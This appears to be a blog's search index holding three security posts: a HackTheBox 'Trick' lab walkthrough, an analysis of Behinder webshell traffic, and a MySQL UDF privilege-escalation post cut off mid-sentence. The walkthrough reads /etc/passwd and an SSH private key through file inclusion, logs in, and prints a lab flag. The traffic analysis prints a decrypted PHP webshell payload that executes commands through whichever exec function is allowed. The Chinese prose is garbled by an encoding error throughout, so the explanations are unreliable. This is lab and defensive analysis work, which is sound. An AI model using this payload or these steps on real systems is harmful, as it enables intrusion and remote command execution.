<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB-tirck</title>
      <link href="/2022/10/14/trick/"/>
      <url>/2022/10/14/trick/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-trické¶æœº"><a href="#HTB-trické¶æœº" class="headerlink" title="HTB trické¶æœº"></a>HTB trické¶æœº</h1><h2 id="æ‰“ç‚¹"><a href="#æ‰“ç‚¹" class="headerlink" title="æ‰“ç‚¹"></a>æ‰“ç‚¹</h2><p>æ‹¿åˆ°é¶æœºé¦–å…ˆnmapè·‘ä¸€æ³¢ä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥çœ‹åˆ°è¿™å°é¶æœºæ¯”ä»¥å¾€çš„é¶æœºå¤šå¼€äº†ä¸ª53ï¼ˆDNSï¼‰ç«¯å£ï¼Œè¿™é¢˜çš„çªç ´å£ä¹Ÿå°±åœ¨53ç«¯å£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bebop)-[~]</span><br><span class="line">â””â”€# nmap -sT -sC -T4 10.10.11.166</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 09:33 EDT</span><br><span class="line">Warning: 10.10.11.166 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 10.10.11.166 (10.10.11.166)</span><br><span class="line">Host is up (0.58s latency).</span><br><span class="line">Not shown: 955 closed tcp ports (conn-refused), 41 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 261.26 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆç›´æ¥æµè§ˆå™¨è®¿é—®80ç«¯å£ï¼Œçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œæ•´ä¸ªé¡µé¢éƒ½æ˜¯é™æ€çš„ï¼Œåˆ°å¤„ç‚¹å‡ ä¸‹ï¼Œæ²¡æœ‰ä»»ä½•æ”¶è·</p><p><img src="/../images/image-20221009214523452.png" alt="image-20221009214523452"></p><p>å› ä¸ºç›®æ ‡å¼€å¯äº†DNSæœåŠ¡ï¼Œæˆ‘ä»¬ç”¨nslookupæ”¶é›†ä¸€ä¸‹ä»–çš„åŸŸåä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bebop)-[~]</span><br><span class="line">â””â”€# nslookup</span><br><span class="line">&gt; server 10.10.11.166</span><br><span class="line">Default server: 10.10.11.166</span><br><span class="line">Address: 10.10.11.166#53</span><br><span class="line">&gt; 10.10.11.166</span><br><span class="line">166.11.10.10.in-addr.arpa       name = trick.htb.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bebop)-[~]</span><br><span class="line">â””â”€# dig axfr @10.10.11.166 trick.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.4-2-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 912 msec</span><br><span class="line">;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)</span><br><span class="line">;; WHEN: Sun Oct 09 22:43:51 EDT 2022</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 231)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«å­—å…¸éå†è¯»å–passwdæ–‡ä»¶ï¼Œå‘ç°ç›®æ ‡å­˜åœ¨åä¸ºmichaelçš„å¯ç™»å½•ç”¨æˆ·</p><p><img src="/../images/image-20221017195802258.png" alt="image-20221017195802258"></p><p>æˆ‘ä»¬å†è¯•ç€è¯»å–ç›®æ ‡ç”¨æˆ·çš„sshç§é’¥</p><p><img src="/../images/image-20221017195902933.png" alt="image-20221017195902933"></p><p>å°è¯•è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bebop)-[~]</span><br><span class="line">â””â”€# ssh michael@10.10.11.166 -i id_rsa</span><br><span class="line">Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Oct 17 10:12:52 2022 from 10.10.14.98</span><br><span class="line">michael@trick:~$ </span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»ä¸Šç›®æ ‡æœºå™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">michael@trick:~$ ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">michael@trick:~$ cat user.txt</span><br><span class="line">721d604007b62320b2c857f3ec3f9260</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ä¸Šä¼ pspyå¯ä»¥å‘ç°ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ–‡ä»¶ï¼Œä½†æ˜¯å®ƒæ¯ä¸€åˆ†é’Ÿä¼šå¯¹è‡ªèº«è¿›è¡Œä¸€æ¬¡æ¢å¤ï¼Œæ‰€ä»¥æ‰‹ä¸€å®šè¦å¿«ã€‚å› ä¸ºç½‘ç»œç¯å¢ƒå®åœ¨å¤ªå¡äº†ï¼Œæ‰€ä»¥å°±æ²¡æœ‰åç»­äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†°èæµé‡åˆ†æ</title>
      <link href="/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="è™šæ‹Ÿç»ˆç«¯"><a href="#è™šæ‹Ÿç»ˆç«¯" class="headerlink" title="è™šæ‹Ÿç»ˆç«¯"></a>è™šæ‹Ÿç»ˆç«¯</h1><p>ä¸å—å®³æœºè¿æ¥åï¼Œåœ¨å†°èè™šæ‹Ÿç»ˆç«¯è¾“å…¥å‘½ä»¤ â€˜whoamiâ€™ ï¼Œåœ¨PHPSTORMä¸­è·å–åˆæ­¥è§£å¯†åçš„æ•°æ®</p><p><img src="/../images/image-20221015170550892.png" alt="image-20221015170550892"></p><p><img src="/../images/image-20221015170626770.png" alt="image-20221015170626770"></p><p>å°†ç¼–ç éƒ¨åˆ†ä»£ç è§£å¯†åï¼Œç®€å•è°ƒæ•´å¾—åˆ°å¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert|<span class="keyword">eval</span>(</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒæ•´ç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">//è·å–disfuncçš„å†…å®¹</span></span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="comment">//å¦‚æœç›®æ ‡æ˜¯windowsåˆ™æ„é€ ç›¸åº”çš„å‘½ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="comment">//åˆ¤æ–­å¯ç”¨å‡½æ•°å¹¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//å¦‚æœä»¥ä¸Šå‡½æ•°éƒ½ä¸å¯ç”¨ï¼Œåˆ™è¿”å›æ— å‡½æ•°å¯ç”¨çš„ä¿¡æ¯</span></span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>), <span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¦‚æœæˆåŠŸæ‰§è¡Œï¼Œåˆ™æŠŠæ‰§è¡Œåçš„ä¿¡æ¯è¿”å›</span></span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),  <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹è¿”å›çš„ä¿¡æ¯åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;cd /d &quot;C:\phppro\phpstudy_pro\WWW\&quot;&amp;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;C:/phppro/phpstudy_pro/WWW/&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç®€å•çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œé¦–å…ˆæˆ‘ä»¬ä¼šè·å–ç›®æ ‡disable_functioné‡Œçš„å†…å®¹ï¼Œå°†é‡Œé¢çš„å†…å®¹å­˜å‚¨åˆ°æ•°ç»„é‡Œã€‚æ¥ç€åˆ¤æ–­å½“å‰ç¯å¢ƒå¯ç”¨çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æœ‰å“ªäº›ï¼Œå¹¶åˆ¤æ–­å‡½æ•°æ˜¯å¦åœ¨disable_functionä¸­ï¼Œå¦‚æœå¯ç”¨ä¸”æœªè¢«ç¦ç”¨åˆ™æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚å¦‚æœæœªèƒ½æ‰§è¡Œåˆ™è¿”å›å¤±è´¥ä¿¡æ¯ï¼Œå°†ä¿¡æ¯åŠ å¯†å¹¶è¿”å›ï¼Œå¦‚æœèƒ½æˆåŠŸæ‰§è¡Œåˆ™æŠŠæ‰§è¡Œç»“æœä¸æˆåŠŸä¿¡æ¯åŠ å¯†å¹¶è¿”å›ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> [object Object] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UDFææƒ</title>
      <link href="/2022/10/12/udf%E6%8F%90%E6%9D%83/"/>
      <url>/2022/10/12/udf%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µæ—¶é—´æ²‰è¿·äºæ‰“é¶ï¼Œä½†æ˜¯æ¯æ¬¡æ‹¿åˆ°webshellä¹‹åæ€è·¯å°±æ–­äº†ï¼Œä¹Ÿè®©æˆ‘å‘ç°è‡ªå·±å¯¹ææƒçŸ¥è¯†ç‚¹æŒæ¡çš„å¹¶ä¸æ˜¯å¾ˆç‰¢å›ºï¼Œæ‹¿ä¸äº†rootã€systemæ€ä¹ˆåŠğŸ˜¢ ,ç»ƒå‘—ï¼</p><h1 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h1><p>UDFï¼ˆUser defined functionï¼‰ï¼Œå³ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯MYSQLçš„ä¸€ä¸ªæ‰©å±•æ¥å£ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨è¯¥æ¥å£æ¥åˆ›å»ºå‡½æ•°ã€‚</p><h1 id="åˆ©ç”¨æ–¹æ³•å’Œæ¡ä»¶"><a href="#åˆ©ç”¨æ–¹æ³•å’Œæ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ–¹æ³•å’Œæ¡ä»¶"></a>åˆ©ç”¨æ–¹æ³•å’Œæ¡ä»¶</h1><p>åˆ©ç”¨æ–¹æ³•</p><blockquote><p>åœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€å¼ è¡¨ï¼Œåœ¨è¡¨ä¸­æ’å…¥udf.dllçš„æ•°æ®ï¼Œå†ä»è¡¨ä¸­æŠŠæ•°æ®å¯¼å‡ºåˆ°ç›¸åº”æ–‡ä»¶å¤¹ï¼ŒMySQLç‰ˆæœ¬å°äº5.1æ—¶ï¼Œå¯¹åº”æ–‡ä»¶å¤¹ä¸ºC:\windows\system32ï¼›åä¹‹åˆ™éœ€è¦æ”¾åœ¨MySQLå®‰è£…ç›®å½•ä¸‹çš„MySQL\</p><p>lib\plugin ä¸‹ï¼ˆä¸€èˆ¬pluginç›®å½•éƒ½ä¸å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨åˆ›å»ºï¼Œ<a 